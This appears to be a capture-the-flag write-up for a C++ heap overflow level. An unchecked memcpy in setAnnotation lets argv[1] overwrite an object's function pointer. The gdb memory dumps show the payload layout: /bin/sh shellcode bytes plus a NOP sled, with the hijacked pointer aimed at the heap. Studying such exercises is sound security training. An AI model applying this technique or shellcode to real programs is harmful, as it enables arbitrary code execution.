@@ -1,0 +1,49 @@
+2.	Content:
+	Upon using `info function` in gdb it seems that we are dealing with a C++ 
+	code in this level. There's a class named N with two operator overloads, 
+	a method called 'setAnnotation' and a parameterized constructor.
+
+	The method 'setAnnotation' calculate the size of a string passed as 
+	argument, and copy its content into a class install attribute (buffer).
+
+	The main checks the number of argument if it not 0x1 the program exits.
+	Otherwise, two instances of the class N are created with the parametrized
+	constructor using the values 0x5 and 0x6 respectively.
+
+	The first object calls the method setAnnotation with argv[1] as argument, 
+	filling the buffer using memcpy without taking into consideration the 
+	buffer size.
+
+	The plus operator overload is called after that.
+
+3.	Solution:
+	We need to overwrite the address of the operator overload in the class 
+	instance using memcpy:
+
+	--> 0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
+		0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
+
+	getting somthing like :
+
+		0x804a008:	0x08048848	0x0804a010	0x895e1feb	0xc0310876
+		0x804a018:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
+		0x804a028:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
+		0x804a038:	0x732f6e69	0x90909068	0x90909090	0x90909090
+		0x804a048:	0x90909090	0x90909090	0x90909090	0x90909090
+		0x804a058:	0x90909090	0x90909090	0x90909090	0x90909090
+		0x804a068:	0x90909090	0x90909090	0x90909090	0x90909090
+	--> 0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000
+		0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
+		0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
+
+	So that when the operator overload is called, the instruction pointer will
+	point in heap area where the shellcode lies (0x804a008 + 0x8)
